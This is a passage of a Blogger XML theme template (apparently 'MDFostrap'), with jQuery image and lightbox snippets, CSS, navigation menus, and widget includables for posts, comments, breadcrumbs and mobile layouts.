  $('.homapge-thumb img').each(function(){  
   var $img = $(this);  
   var filename = $img.attr('src')  
   $img.attr('title', filename.substring((filename.lastIndexOf('/'))+1, filename.lastIndexOf('.')));  
   $img.attr('alt', filename.substring((filename.lastIndexOf('/'))+1, filename.lastIndexOf('.')));  
  });  
 });  
 //]]>  
 </script> 
</b:if>
</b:if> 
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<script>

$(document).ready(function() {
  $(&#39;.post-single-outer img&#39;).addClass(&#39;materialboxed&#39;)
  $(&#39;.post-single-outer img&#39;).addClass(&#39;responsive-img&#39;) 
  $(&#39;.materialboxed&#39;).materialbox();
});
        
</script>
<style type='text/css'>
#comments {
    margin: 35px 0;
  } 
#related-posts h2{margin-top: 10px;background:none;font-size:22px;margin:0;line-height:normal;padding:3px;color:#999999; text-transform:uppercase;}
#related-posts .related_img {object-fit: cover;width:100%;height:200px;cursor:pointer}
@media (max-width:397px){.post-header{margin:0px auto 0px !important;}}
#related-title { text-align:center;padding: 0px 5px 10px;font-size:15px;width:100%; height: 40px;}
#blog-pager{    padding: 10px 8px;
    margin: 10px -10px;} </style><script>
//<![CDATA[ 
$(document).ready(function() { 
  var related_img = 300; 
  $('.related_img').each(function(n, image){
    var image = $(image);
    image.attr({src : image.attr('src').replace(/s\B\d{2,4}/,'s' + related_img)});
    image.attr('width',related_img);
    image.attr('height',related_img);
  });
});
//]]>
</script>
<script src='https://googledrive.com/host/0Bwg9nKxkueEjMWRRSnpvTGJXcTQ' type='text/javascript'/>  
</b:if>   
  </head>
  <body class='main-body'>
   <header class='cyan' style='display:none;'>
    <div class='container container-box'>
      <div class='clearfix'/>
      <div id='main-header-wrapper'>
        <div class='container-slash'>
          <div class='row' id='header-wrapper'>
            <div class='col s12 m6 l4 head-hidden'>

              <b:section class='' id='blog-title' maxwidgets='1' showaddelement='yes' title='My Favorite Things'>
                <b:widget id='Header1' locked='true' title='MDFOSTRAP (Header)' type='Header' visible='true'>
                  <b:includable id='main'>
                    <b:if cond='data:useImage'>
                      <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'> 
                        <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height + &quot;px;&quot;                      + &quot;_height: &quot; + data:height + &quot;px;&quot;                      + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
                          <div class='titlewrapper' style='background: transparent'>
                            <h1 class='title' style='background: transparent; border-width: 0px'>
                              <b:include name='title'/>
                            </h1>
                          </div>
                          <b:include name='description'/>
                        </div>
                        <b:else/>
                        <!--Show the image only-->
                        <div id='header-inner'>
                          <a expr:href='data:blog.homepageUrl' style='display: block'>
                            <img expr:alt='data:title' expr:height='data:height' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' expr:width='data:width' style='display: block'/>
                          </a>
                          <!--Show the description-->
                          <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                            <b:include name='description'/>
                          </b:if>
                        </div>
                      </b:if>
                      <b:else/>
                      <!--No header image -->
                      <div id='header-inner'>
                        <div class='titlewrapper'>
                          <b:if cond='data:blog.pageType == &quot;item&quot;'>
                            <div class='head-top-title'>
                              <b:include name='title'/>
                            </div>
                            <b:include name='description'/>
                            <b:else/>
                            <h1 class='head-top-title'>
                              <b:include name='title'/>
                            </h1>
                            <b:include name='description'/>
                          </b:if>
                        </div>
                      </div>
                    </b:if>
                  </b:includable>
                  <b:includable id='description'>
                    <div class='descriptionwrapper'>
                      <p class='description'>
                        <span>
                          <data:description/>
                        </span>
                      </p>
                    </div>
                  </b:includable>
                  <b:includable id='title'>
                    <b:if cond='data:blog.url == data:blog.homepageUrl'>
                      <data:title/>
                      <b:else/>
                      <a expr:href='data:blog.homepageUrl'>
                        <data:title/>
                      </a>
                    </b:if>
                  </b:includable>
                </b:widget>
              </b:section>
            </div> 
          </div>
        </div>
        <div class='clearfix'/>
      </div>
      <div class='clearfix'/>
    </div>
    </header>
    <!-- Start Navbar Top -->
    <header>
    <div class='fooontainer'>
        
        <nav class='cyan darken-1 hide-on-med-and-down first-top'>
          <div class='container'> 
              <ul class=''>
                <li><a href=''>Home</a></li>
                <li><a href=''>About</a></li>
                <li><a href='http://mdfostrap.blogspot.co.id/p/contact.html' title='Contact'>Contact</a></li>
                <li><a href=''>Disclaimer</a></li>
                <li><a href=''>Privacy</a></li>
                <li><a href=''>Terms</a></li>
                <li class='active'><a href='http://www.fostrap.com/' title='Download'>Download</a></li>
              </ul>
            <div class='nav-wrapper'>
              <ul class='right hide-on-med-and-down'>
                <li class='active'><a href=''><i class='fa fa-facebook'/></a></li>
                <li class='active'><a href=''><i class='fa fa-twitter'/></a></li>
                <li class='active'><a href=''><i class='fa fa-google-plus'/></a></li>
              </ul>
            </div>
          </div>
        </nav>

       <nav class='nav-top cyan'>
          <div class='container'>
               <div class='nav-wrapper'>
  
          <b:if cond='data:blog.url == data:blog.homepageUrl'>
                        <div class='brand-logo logo-main waves-effect waves-light'>  
						  <!-- logo -->
                      	  <img alt='logo' class='img-logo-main' src='https://4.bp.blogspot.com/-Oep-lZOkvrA/Vwi85F3UXKI/AAAAAAAAB6E/riLe0St925ciu5BNO_7h27Nvqtt8e8Obw/s1600/mdfostrap%2Blogo.png' title='logo'/>
                          <h1><data:blog.title/></h1>
                        </div>
                      <b:else/>
                        <div class='brand-logo logo-main waves-effect waves-light'>  
                      	  <img alt='logo' class='img-logo-main' src='https://4.bp.blogspot.com/-Oep-lZOkvrA/Vwi85F3UXKI/AAAAAAAAB6E/riLe0St925ciu5BNO_7h27Nvqtt8e8Obw/s1600/mdfostrap%2Blogo.png' title='logo'/>
                          <a class='' expr:href='data:blog.homepageUrl'>
                            <h1><data:blog.title/></h1>
                          </a>
                        </div>
                    </b:if>
                     
                  <ul class='right side-nav' id='slide-out'>

                    <li class='cyan center'>
                       <b:if cond='data:blog.url == data:blog.homepageUrl'> 
                          <!-- if you want to show image behind your blog title
                            <img class='img-logo-main' src='YOUR IMAGE URL'/> -->
                                <span class='white-text' style='font-size: 22px'>
                                  <data:blog.title/>
                                </span> 
                            <b:else/>  
                            <!-- if you want to show image behind your blog title 
                                <img class='img-logo-main' src='YOUR IMAGE URL'/> -->
                                <a class='white-text' expr:href='data:blog.homepageUrl' style='font-size: 22px' title='MDFostrap'>
                                  <data:blog.title/>
                                </a> 
                            </b:if> 
                     </li> 
                    <li><a href='#!'>Home<!--<i class='medium mdi-action-home'/>--></a></li>
                    <li><a href='#!'>About</a></li>
                    <li><a href='#!'>Contact</a></li>
                    <li class='no-padding'>
                      <ul class='collapsible collapsible-accordion'>
                        <li>
                          <a class=' collapsible-header'>Dropdown<i class='mdi-navigation-arrow-drop-down'/></a>
                          <div class='collapsible-body'>
                            <ul>
                              <li><a href='#!'>First</a></li>
                              <li><a href='#!'>Second</a></li>
                              <li><a href='#!'>Third</a></li>
                              <li><a href='#!'>Fourth</a></li>
                            </ul>
                          </div>
                        </li>
                      </ul>
                    </li>
                  </ul> 
                  <ul class='right hide-on-med-and-down' id='menudesktop'>
                    <li><a class='waves-effect waves-light' href='http://mdfostrap.blogspot.co.id/' title='Home'>Home</a></li> 
                  <li><a class='waves-effect waves-light' href='http://mdfostrap.blogspot.co.id/search/label/Blogger' title='Blogger'>Blogger</a></li>  
                    <li><a class='waves-effect waves-light dropdown-button' data-activates='webdesign-dropdown' href='javascript:void(0)' title='Web Design'>Web Design<i class='mdi-navigation-arrow-drop-down right'/></a></li>
                    <ul class='dropdown-content' id='webdesign-dropdown'>
                      <li><a class='cyan-text' href='http://mdfostrap.blogspot.co.id/search/label/html' title='HTML'>HTML</a></li>
                      <li><a class='cyan-text' href='http://mdfostrap.blogspot.co.id/search/label/CSS' title='CSS'>CSS</a></li>
                      <li><a class='cyan-text' href='http://mdfostrap.blogspot.co.id/search/label/Javascript' title='Javascript'>Javascript</a></li>
                      <li><a class='cyan-text' href='http://mdfostrap.blogspot.co.id/search/label/JQuery' title='JQuery'>JQuery</a></li>
                    </ul>     
                    <li class='hide-on-med-and-down'><a class='waves-effect waves-cyan' href='javascript:void(0)' id='nav_searchbox_counter' title='search'><i class='mdi-action-search'/></a></li>
                  </ul>
                  <a class='button-collapse' data-activates='slide-out' href='#' title='Menu'><i class='mdi-navigation-menu'/></a>
                  <a class='right hide-on-large-only' href='javascript:void(0)' id='nav_m_searchbox_counter' title='Search'><i class='mdi-action-search'/></a>
              </div>
          </div>
       </nav> 
       <nav id='nav_searchbox' style='display:none'>
            <form action='/search' autocomplete='off' class='f white lighten-2' id='searchbox' method='get' style='height: 100%;'>
              <div class='input-field' style='height: 100%;'>
                <input class='searchTerm' id='search' name='q' placeholder='What&apos;re we looking for?' type='search'/>
                <label for='search'><i class='mdi-action-search black-text' style='font-size:31px'/></label><i class='mdi-navigation-close close black-text'/>
              </div>
            </form>
        </nav>
    </div>
    </header>
    <div class='clearfix'/>  
    <div class='banner-ads banner-header container center' id='banner-header'>
        <!-- YOUR ADS CODE --> 
    </div>  
    <div class='container container-box'>
      <div class=''>
        <div class='row'>
          <div class='col s12 m12 l8'>
            <b:section class='main' id='main' showaddelement='no'>
              <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='1' visible='true'>
                <b:includable id='main' var='top'>

                  <b:if cond='data:mobile == &quot;false&quot;'>
                    <!-- posts -->
                    <div class='blog-posts hfeed'>
                      <b:include data='top' name='status-message'/>
<b:include data='posts' name='breadcrumb'/>
                      <data:defaultAdStart/>
                      <b:loop values='data:posts' var='post'>
                        <b:if cond='data:post.isDateStart'>
                          <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
                            &lt;/div&gt;&lt;/div&gt;
                          </b:if>
                        </b:if>
                        <b:if cond='data:post.isDateStart'>
                          &lt;div class=&quot;date-outer&quot;&gt;
                        </b:if>
                        <b:if cond='data:post.dateHeader'>
                          <h2 class='date-header'>
                            <span>
                              <data:post.dateHeader/>
                            </span>
                          </h2>
                        </b:if>
                        <b:if cond='data:post.isDateStart'>
                          &lt;div class=&quot;date-posts&quot;&gt;
                        </b:if>
                        <div class='post-outer'>
                          <b:include data='post' name='post'/>
                          <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
                            <b:include data='post' name='comment_picker'/>
                          </b:if>
                          <b:if cond='data:blog.pageType == &quot;item&quot;'>
                            <b:include data='post' name='comment_picker'/>
                          </b:if>
                        </div>
                        <b:if cond='data:post.includeAd'>
                          <b:if cond='data:post.isFirstPost'>
                            <data:defaultAdEnd/>
                            <b:else/>
                            <data:adEnd/>
                          </b:if>
                          <div class='inline-ad'>
                            <data:adCode/>
                          </div>
                          <data:adStart/>
                        </b:if>
                      </b:loop>
                      <b:if cond='data:numPosts != 0'>
                        &lt;/div&gt;&lt;/div&gt;
                      </b:if>
                      <data:adEnd/>
                    </div>
                    <!-- navigation -->
                    <b:if cond='data:blog.pageType != &quot;item&quot;'>
                    <b:include name='nextprev'/>
                  </b:if>
                    <!-- feed links -->
                    <b:include name='feedLinks'/>
                    <b:if cond='data:top.showStars'>
                      <script src='//www.google.com/jsapi' type='text/javascript'/>
                      <script type='text/javascript'>
                        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
                        function initialize() {
                          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
                          google.annotations.createAll();
                          google.annotations.fetch();
                        }
                        google.setOnLoadCallback(initialize);
                      </script>
                    </b:if>
                    <b:else/>
                    <b:include name='mobile-main'/>
                  </b:if>
                  <b:if cond='data:top.showDummy'>
                    <data:top.dummyBootstrap/>
                  </b:if>
                </b:includable>
                <b:includable id='backlinkDeleteIcon' var='backlink'>
                  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
                    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
                      <img src='//www.blogger.com/img/icon_delete13.gif'/>
                    </a>
                  </span>
                </b:includable>
                <b:includable id='backlinks' var='post'>
                  <a name='links'/>
                  <h4>
                    <data:post.backlinksLabel/>
                  </h4>
                  <b:if cond='data:post.numBacklinks != 0'>
                    <dl class='comments-block' id='comments-block'>
                      <b:loop values='data:post.backlinks' var='backlink'>
                        <div class='collapsed-backlink backlink-control'>
                          <dt class='comment-title'>
                            <span class='backlink-toggle-zippy'>
                              &#160;
                            </span>
                            <a expr:href='data:backlink.url' rel='nofollow'>
                              <data:backlink.title/>
                            </a>
                            <b:include data='backlink' name='backlinkDeleteIcon'/>
                          </dt>
                          <dd class='comment-body collapseable'>
                            <data:backlink.snippet/>
                          </dd>
                          <dd class='comment-footer collapseable'>
                            <span class='comment-author'>
                              <data:post.authorLabel/>
                              <data:backlink.author/>
                            </span>
                            <span class='comment-timestamp'>
                              <data:post.timestampLabel/>
                              <data:backlink.timestamp/>
                            </span>
                          </dd>
                        </div>
                      </b:loop>
                    </dl>
                  </b:if>
                  <p class='comment-footer'>
                    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'>
                      <data:post.createLinkLabel/>
                    </a>
                  </p>
                </b:includable>
                <b:includable id='breadcrumb' var='posts'>
              <b:if cond='data:blog.homepageUrl == data:blog.url'>
              <!-- No breadcrumb on home page -->
              <b:else/>
              <b:if cond='data:blog.pageType == &quot;item&quot;'>
                
              <!-- breadcrumb for the post page -->
              <p class='breadcrumbs'>
              <span class='post-labels'>
              <a expr:href='data:blog.homepageUrl' rel='tag'>Home</a>
              <b:loop values='data:posts' var='post'>
              <b:if cond='data:post.labels'>
              <b:loop values='data:post.labels' var='label'>
                <b:if cond='data:label.isLast == &quot;true&quot;'> <i class='fa fa-angle-right'/>
              <a expr:href='data:label.url' rel='tag'><data:label.name/></a>
              </b:if>
              </b:loop>
              <b:else/>
              <i class='fa fa-angle-right'/> Unlabelled 
              </b:if>
              <i class='fa fa-angle-right'/> <span><data:post.title/></span>
              </b:loop>
              </span>
              </p>

              <b:else/>
              <b:if cond='data:blog.pageType == &quot;archive&quot;'>
              <!-- breadcrumb for the label archive page and search pages.. -->
              <p class='breadcrumbs'>
              <span class='post-labels'>
              <a expr:href='data:blog.homepageUrl'>Home</a> <i class='fa fa-angle-right'/> Archives for <data:blog.pageName/>
              </span>
              </p>
              <b:else/>
              <b:if cond='data:blog.pageType == &quot;index&quot;'>
              <p class='breadcrumbs'>
              <span class='post-labels'>
              <b:if cond='data:blog.pageName == &quot;&quot;'>
              <a expr:href='data:blog.homepageUrl'>Home</a> <i class='fa fa-angle-right'/> All posts
              <b:else/>
              <a expr:href='data:blog.homepageUrl'>Home</a> <i class='fa fa-angle-right'/> <data:blog.pageName/>
              </b:if>
              </span>
              </p>
              </b:if>
              </b:if>
              </b:if>
              </b:if>
              </b:includable>
                <b:includable id='comment-form' var='post'>
                  <div class='comment-form'>
                    <a name='comment-form'/>
                    <b:if cond='data:mobile'>
                      <h4 id='comment-post-message'>
                        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'>
                          <data:postCommentMsg/>
                        </a>
                      </h4>
                      <p>
                        <data:blogCommentMessage/>
                      </p>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
                      <b:else/>
                      <h4 id='comment-post-message'>
                        <data:postCommentMsg/>
                      </h4>
                      <p>
                        <data:blogCommentMessage/>
                      </p>
                      <data:blogTeamBlogMessage/>
                      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
                      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
                    </b:if>
                    <data:post.friendConnectJs/>
                    <data:post.cmtfpIframe/>
                    <script type='text/javascript'>
                      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
                    </script>
                  </div>
                </b:includable>
                <b:includable id='commentDeleteIcon' var='comment'>
                  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
                    <b:if cond='data:showCmtPopup'>
                      <div class='goog-toggle-button'>
                        <div class='goog-inline-block comment-action-icon'/>
                      </div>
                      <b:else/>
                      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
                        <img src='//www.blogger.com/img/icon_delete13.gif'/>
                      </a>
                    </b:if>
                  </span>
                </b:includable>
                <b:includable id='comment_count_picker' var='post'>
                  <b:if cond='data:post.commentSource == 1'>
                    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.canonicalUrl'>
                    </span>
                    <b:else/>
                    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                      <data:post.commentLabelFull/>
                    </a>
                  </b:if>
                </b:includable>
                <b:includable id='comment_picker' var='post'>
                  <b:if cond='data:post.commentSource == 1'>
                    <b:include data='post' name='iframe_comments'/>
                    <b:else/>
                    <b:if cond='data:post.showThreadedComments'>
                      <b:include data='post' name='threaded_comments'/>
                      <b:else/>
                      <b:include data='post' name='comments'/>
                    </b:if>
                  </b:if>
                </b:includable>
                <b:includable id='comments' var='post'>
                  <div class='comments card-panel' id='comments'>
                    <a name='comments'/>
                    <b:if cond='data:post.allowComments'>
                      <h4>
                        <data:post.commentLabelFull/>
                        :
                      </h4>
                      <b:if cond='data:post.commentPagingRequired'>
                        <span class='paging-control-container'>
                          <b:if cond='data:post.hasOlderLinks'>
                            <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
                              <data:post.oldestLinkText/>
                            </a>
                            &#160;
                            <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
                              <data:post.olderLinkText/>
                            </a>
                            &#160;
                          </b:if>
                          <data:post.commentRangeText/>
                          <b:if cond='data:post.hasNewerLinks'>
                            &#160;
                            <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
                              <data:post.newerLinkText/>
                            </a>
                            &#160;
                            <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
                              <data:post.newestLinkText/>
                            </a>
                          </b:if>
                        </span>
                      </b:if>
                      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
                        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
                          <b:loop values='data:post.comments' var='comment'>
                            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
                              <b:if cond='data:comment.favicon'>
                                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
                              </b:if>
                              <a expr:name='data:comment.anchorName'/>
                              <b:if cond='data:blog.enabledCommentProfileImages'>
                                <data:comment.authorAvatarImage/>
                              </b:if>
                              <b:if cond='data:comment.authorUrl'>
                                <a expr:href='data:comment.authorUrl' rel='nofollow'>
                                  <data:comment.author/>
                                </a>
                                <b:else/>
                                <data:comment.author/>
                              </b:if>
                              <data:commentPostedByMsg/>
                            </dt>
                            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
                              <b:if cond='data:comment.isDeleted'>
                                <span class='deleted-comment'>
                                  <data:comment.body/>
                                </span>
                                <b:else/>
                                <p>
                                  <data:comment.body/>
                                </p>
                              </b:if>
                            </dd>
                            <dd class='comment-footer'>
                              <span class='comment-timestamp'>
                                <a expr:href='data:comment.url' title='comment permalink'>
                                  <data:comment.timestamp/>
                                </a>
                                <b:include data='comment' name='commentDeleteIcon'/>
                              </span>
                            </dd>
                          </b:loop>
                        </dl>
                      </div>
                      <b:if cond='data:post.commentPagingRequired'>
                        <span class='paging-control-container'>
                          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
                            <data:post.oldestLinkText/>
                          </a>
                          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
                            <data:post.olderLinkText/>
                          </a>
                          &#160;
                          <data:post.commentRangeText/>
                          &#160;
                          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
                            <data:post.newerLinkText/>
                          </a>
                          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
                            <data:post.newestLinkText/>
                          </a>
                        </span>
                      </b:if>
                      <p class='comment-footer'>
                        <b:if cond='data:post.embedCommentForm'>
                          <b:if cond='data:post.allowNewComments'>
                            <b:include data='post' name='comment-form'/>
                            <b:else/>
                            <data:post.noNewCommentsText/>
                          </b:if>
                          <b:else/>
                          <b:if cond='data:post.allowComments'>
                            <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                              <data:postCommentMsg/>
                            </a>
                          </b:if>
                        </b:if>
                      </p>
                    </b:if>
                    <b:if cond='data:showCmtPopup'>
                      <div id='comment-popup'>
                        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
                        </iframe>
                      </div>
                    </b:if>
                    <div id='backlinks-container'>
                      <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
                        <b:if cond='data:post.showBacklinks'>
                          <b:include data='post' name='backlinks'/>
                        </b:if>
                      </div>
                    </div>
                  </div>
                </b:includable>
                <b:includable id='feedLinks'>
                  <b:if cond='data:blog.pageType != &quot;item&quot;'>
                    <!-- Blog feed links -->
                    <b:if cond='data:feedLinks'>
                      <div class='blog-feeds'>
                        <b:include data='feedLinks' name='feedLinksBody'/>
                      </div>
                    </b:if>
                    <b:else/>
                    <!--Post feed links -->
                    <div class='post-feeds'>
                      <b:loop values='data:posts' var='post'>
                        <b:if cond='data:post.allowComments'>
                          <b:if cond='data:post.feedLinks'>
                            <b:include data='post.feedLinks' name='feedLinksBody'/>
                          </b:if>
                        </b:if>
                      </b:loop>
                    </div>
                  </b:if>
                </b:includable>
                <b:includable id='feedLinksBody' var='links'>
                  <div class='feed-links'>
                    <data:feedLinksMsg/>
                    <b:loop values='data:links' var='f'>
                      <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'>
                        <data:f.name/>
                        (
                        <data:f.feedType/>
                        )
                      </a>
                    </b:loop>
                  </div>
                </b:includable>
                <b:includable id='iframe_comments' var='post'>
                  <b:if cond='data:post.allowIframeComments'>
                    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
                    <div class='cmt_iframe_holder' expr:data-href='data:post.canonicalUrl' expr:data-viewtype='data:post.viewType'/>
                    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
                      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
                        <data:postCommentMsg/>
                      </a>
                    </b:if>
                  </b:if>
                </b:includable>
                <b:includable id='mobile-index-post' var='post'>
                  <div class='mobile-date-outer date-outer'>
                    <b:if cond='data:post.dateHeader'>
                      <div class='date-header'>
                        <span>
                          <data:post.dateHeader/>
                        </span>
                      </div>
                    </b:if>
                    <div class='mobile-post-outer'>
                      <a expr:href='data:post.url'>
                        <h3 class='mobile-index-title entry-title' itemprop='name'>
                          <data:post.title/>
                        </h3>
                        <div class='mobile-index-arrow'>
                          &amp;rsaquo;
                        </div>
                        <div class='mobile-index-contents'>
                          <b:if cond='data:post.thumbnailUrl'>
                            <div class='mobile-index-thumbnail'>
                              <div class='Image'>
                                <img expr:src='data:post.thumbnailUrl'/>
                              </div>
                            </div>
                          </b:if>
                          <div class='post-body'>
                            <b:if cond='data:post.snippet'>
                              <data:post.snippet/>
                            </b:if>
                          </div>
                        </div>
                        <div style='clear: both;'/>
                      </a>
                      <div class='mobile-index-comment'>
                        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                          <b:if cond='data:post.allowComments'>
                            <b:if cond='data:post.numComments != 0'>
                              <b:include data='post' name='comment_count_picker'/>
                            </b:if>
                          </b:if>
                        </b:if>
                      </div>
                    </div>
                  </div>
                </b:includable>
                <b:includable id='mobile-main' var='top'>
                  <!-- posts -->
                  <div class='blog-posts hfeed'>
                    <b:include data='top' name='status-message'/>
                    <b:if cond='data:blog.pageType == &quot;index&quot;'>
                      <b:loop values='data:posts' var='post'>
                        <b:include data='post' name='mobile-index-post'/>
                      </b:loop>
                      <b:else/>
                      <b:loop values='data:posts' var='post'>
                        <b:include data='post' name='mobile-post'/>
                      </b:loop>
                    </b:if>
                  </div>
                  <b:include name='mobile-nextprev'/>
                </b:includable>
                <b:includable id='mobile-nextprev'>
                  <div class='blog-pager' id='blog-pager'>
                    <b:if cond='data:newerPageUrl'>
                      <div class='mobile-link-button' id='blog-pager-newer-link'>
                        <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>
                          <i class='fa fa-long-arrow-left'/>
                        </a>
                      </div>
                    </b:if>
                    <b:if cond='data:olderPageUrl'>
                      <div class='mobile-link-button' id='blog-pager-older-link'>
                        <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>
                          <i class='fa fa-long-arrow-right'/>
                        </a>
                      </div>
                    </b:if>
                 <!--<div class='mobile-link-button' id='blog-pager-home-link'>
                      <a class='home-link' expr:href='data:blog.homepageUrl'>
                        <data:homeMsg/>
                      </a>
                    </div>
                    <div class='mobile-desktop-link'>
                      <a class='home-link' expr:href='data:desktopLinkUrl'>
                        <data:desktopLinkMsg/>
                      </a>
                    </div>-->
                  </div>
                  <div class='clear'/>
                </b:includable>
                <b:includable id='mobile-post' var='post'>
                  <div class='date-outer'>
                    <b:if cond='data:post.dateHeader'>
                      <h2 class='date-header'>
                        <span>
                          <data:post.dateHeader/>
                        </span>
                      </h2>
                    </b:if>
                    <div class='date-posts'>
                      <div class='post-outer'>
                        <article class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
                          <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                              <abbr class='published gv' expr:content='data:post.timestampISO8601' itemprop='datePublished dateModified'>
                                  <span class='updated'>
                                      <data:post.dateheader/>  
                                      <data:post.timestamp/>
                                  </span>
                              </abbr>
                          </a>
                          <b:if cond='data:post.thumbnailUrl'>
                            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
                          </b:if>
                          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
                          <meta expr:content='data:post.id' itemprop='postId'/>
                          <a expr:name='data:post.id'/>
                          <b:if cond='data:post.title'>
                            <h3 class='post-title entry-title cyan-text' itemprop='headline'>
                              <b:if cond='data:post.link'>
                                <a expr:href='data:post.link'>
                                  <data:post.title/>
                                </a>
                                <b:else/>
                                <b:if cond='data:post.url'>
                                  <b:if cond='data:blog.url != data:post.url'>
                                    <a expr:href='data:post.url'>
                                      <data:post.title/>
                                    </a>
                                    <b:else/>
                                    <data:post.title/>
                                  </b:if>
                                  <b:else/>
                                  <data:post.title/>
                                </b:if>
                              </b:if>
                            </h3>
                          </b:if>
                          <div class='post-header'>
                            <div class='post-header-line-1'/>
                          </div>
                          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
                            <data:post.body/>            

                            <div style='clear: both;'/>
                            <!-- clear for photos floats -->
                          </div>
                          <div class='post-footer'>
                            <div class='post-footer-line post-footer-line-1'>

<span class='post-author vcard'>
                               <b:if cond='data:top.showAuthor'>
                                <span class='vcard' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                    <span class='fn'> 
                                            <i class='fa fa-user'>
                                            </i>
                                                     <span itemprop='name'>
                                                        <data:post.author/>
                                                    </span>
                                    </span>
                                </span>
                               </b:if>
                            </span>  

                              <span class='post-author vcard'>
                                <b:if cond='data:top.showAuthor'>
                                  <b:if cond='data:post.authorProfileUrl'>
                                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                                        <span itemprop='name'>
                                          <data:post.author/>
                                        </span>
                                      </a>
                                    </span>
                                    <b:else/>
                                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                                      <span itemprop='name'>
                                        <data:post.author/>
                                      </span>
                                    </span>
                                  </b:if>
                                </b:if>
                              </span>

                              <span class='post-timestamp'>
                                <b:if cond='data:top.showTimestamp'>
                                  <data:top.timestampLabel/>
                                  <b:if cond='data:post.url'>
                                    <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
                                      <abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished dateModified'>
                                        <data:post.timestamp/>
                                      </abbr>
                                    </a>
                                  </b:if>
                                </b:if>
                              </span>
                              <span class='post-comment-link'>
                                <b:if cond='data:blog.pageType != &quot;item&quot;'>
                                  <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                                    <b:if cond='data:post.allowComments'>
                                      <b:include data='post' name='comment_count_picker'/>
                                    </b:if>
                                  </b:if>
                                </b:if>
                              </span>
                            </div>
                            <div class='post-footer-line post-footer-line-2'>
                              <b:if cond='data:top.showMobileShare'>
